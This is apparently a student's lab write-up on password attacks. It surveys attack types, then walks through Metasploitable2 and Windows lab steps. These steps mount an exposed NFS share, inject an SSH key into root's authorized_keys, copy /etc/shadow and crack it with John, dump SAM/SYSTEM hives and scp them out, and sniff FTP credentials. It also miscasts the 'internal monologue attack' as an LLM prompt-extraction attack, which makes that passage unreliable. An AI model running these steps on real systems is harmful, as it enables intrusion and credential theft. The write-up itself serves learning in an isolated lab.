## types of password attacks : 

#### non-electronic attacks : 

-shoulder surfing , social engineering ( younger siblings' name + birth date is very common xd ) and dumpster diving.

#### active online attacks : 

this is where the attacker performs password cracking by directly communicating with the victim's machine , multiple types of attacks exist  : 

- dictionnary attack : the attacker loads a dictionnary file into the machine and runs it against the user's passwords.
- Brute-force attack : trying every possible combo until the password is broken 
- Rule-based attack : this is used when the attacker gets some information about the password.

a lof the time , the three attacks above are used at the same time.

- Hash injection / pass-the-hash : the attacker steals the hash and uses the has itself to authenticat , without ever knowing the original password.

- Internal monologue attack : this usually refers to an LLM attack where someone tries to expose hidden reasoning, hidden instructions, or private system prompts. In other words, they try to get the model to reveal information that was meant to stay internal.

- NBT-NS poisoning : this is for old windows name-resolution protocols , but when a machine  doesnt know how to resolve a hostname properly , it can ask the local network , the attacker can answer first and act as the requested machine to trick the victim into sending it credential data.

#### Offline attacks : 

- Rainbow attack : this attack uses a precomputed lookup table ; a system stores a hash of a password , not the password itself , an attacker goes throught those hashes and instead of guessing each hash from scratch , he uses a huge table that already maps many likely passwords to their hashes.

this type of attack works only against unsalted hashes ; ```foufou123`` hashes to the same value in an unsalted system , but with a random salt , the same password will produce a different hash for each user, making the use of the hashes' table or the rainbow table useless.


#### an example of creating a rainbow table using rtgen 



#### Default passwords : 

-default passwords are also a thing , and it goes beyond ``anonymous`` for ftp ( this wasnt meant to be a secure login method btw , it was a convention for public access , but its been disabled recently due to security risks) , multiple websites have these and you can look them up.


#### password cracking tools : 

Offline attacks (Hashcat, John the ripper): work on stolen hashes → faster, more powerful

Online attacks (Hydra, Medusa): target live logins → slower, detectable, often blocked

- modern systems make password cracking a lot harder , by using stronger hashing algorithms , salting , rate limiting and MFA.


#### Linux password cracking  : 

In this lab , we'll exploit a misconfigured NFS service to access password files then crack them using john the ripper.

*** what s NFS ? : Network file system is a protocol used in linux/unix systems thats lets one computer share files/directories over the network so other machines can access them , runs on port 2049.

*** how it works : 
1. the server exports (shares) a directory
2. the client machine mounts that directory ( attaches the remote folder so it appears local to it )
3. the client then has access to the shared folder.

now for the actual lab part :

#### target identification : 

first , i checked the target machine and got its ip using `ifconfig` on metasploitable2.

- target ip : `192.168.142.134`

that confirmed the machine was up and reachable on the local network.

#### port scanning :

after that , i ran an `nmap` scan to see what services were exposed :

```bash
nmap 192.168.142.134
```

the scan showed a lot of open ports like ftp , ssh , telnet , http , mysql and more , but the important one for this part was port `2049` because that usually means nfs is running.

#### nfs enumeration :

once i knew nfs was there , i checked what was being shared :

```bash
showmount -e 192.168.142.134
```

the result showed `/` was exported to `*` , which is really bad because it basically means the whole filesystem was shared to anyone on the network.

#### mounting the remote filesystem :

to access that share , i created a mount point and mounted it locally :

```bash
mkdir /tmp/mnt
sudo mount -t nfs 192.168.142.134:/ /tmp/mnt
```

after that , the victim's filesystem showed up like a local folder on my machine , which made everything way easier.

#### ssh key injection :

to get stable access , i generated an ssh key pair first :

```bash
ssh-keygen
```

then i added my public key to the target's root `authorized_keys` file through the mounted nfs share. since the root directory was exposed , this part was possible without knowing the root password , which is kind of wild.

#### remote access via ssh :

once the key was in place , i connected to the machine as root :

```bash
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa root@192.168.142.134
```

and that gave me a root shell on the metasploitable machine. at that point the box was basically cooked.

#### extracting linux password hashes :

after mounting the share , i grabbed the password files from the remote `/etc` directory :

- `/etc/passwd`
- `/etc/shadow`

`passwd` is readable more easily , but `shadow` needed elevated privileges while copying it locally. after that , i merged both files with `unshadow` so john the ripper could read them properly.

```bash
sudo cp /tmp/mnt/etc/passwd /tmp/passwd
sudo cp /tmp/mnt/etc/shadow /tmp/shadow
sudo chmod 644 /tmp/shadow
unshadow /tmp/passwd /tmp/shadow > ~/hashes111.txt
```

#### cracking the linux hashes :

then i ran john against the merged file :

```bash
john ~/hashes111.txt
```

john cracked several weak passwords almost immediately , including :

- `postgres : postgres`
- `user : user`
- `msfadmin : msfadmin`
- `service : service`
- `sys : batman`
- `klog : 123456789`

this part shows why weak and reused passwords are such a problem ; if the attacker gets the hashes offline , the rest can go very fast.

#### windows password cracking :

for the windows part , the goal was to extract the sam database and analyze the hashes from the attacker machine.

#### dumping the sam and system hives :

on the windows machine , i saved the registry hives with :

```powershell
reg save HKLM\SAM C:\Users\Public\sam.save
reg save HKLM\SYSTEM C:\Users\Public\system.save
```

these files contain the data needed to recover local account password hashes.

#### transferring the files :

then i moved both files to the ubuntu attacker machine using `scp` :

```powershell
scp C:\Users\Public\sam.save bloss@192.168.142.131:/home/bloss
scp C:\Users\Public\system.save bloss@192.168.142.131:/home/bloss
```

#### extracting windows hashes :

once the files were on ubuntu , i used `samdump2` to extract the hashes :

```bash
samdump2 system.save sam.save > hashes.txt
cat hashes.txt
```

the output showed multiple accounts and a repeated ntlm hash :

```text
31d6cfe0d16ae931b73c59d7e0c089c0
```

this hash is the classic value for an empty password , so seeing it on accounts like `Administrator` and `Guest` means those accounts were basically left with no password at all.

#### sniffing passwords with wireshark :

the last part of the lab was about capturing credentials directly from network traffic.

#### starting the capture :

i launched wireshark on the attacker machine , selected the active interface `ens37` , and used the `ftp` display filter to keep things simple and only watch ftp traffic.

#### analyzing the packets :

after an ftp login happened , wireshark showed the credentials in clear text :

- `USER msfadmin`
- `PASS msfadmin`

that means the username and password were sent over the network without encryption. so anyone on the same network segment with a sniffer could read them , which is exactly why ftp is considered insecure now.

#### conclusion :

this lab showed three different ways passwords can get exposed :

- bad nfs configuration can lead to full file access and even root compromise
- weak linux passwords can be cracked quickly once the hashes are stolen
- windows password hashes can be extracted from sam/system hives
- old protocols like ftp still leak usernames and passwords in plain text

so yeah , password security is not just about choosing a strong password ; it also depends on system configuration , access control and using protocols that do not leak credentials everywhere.







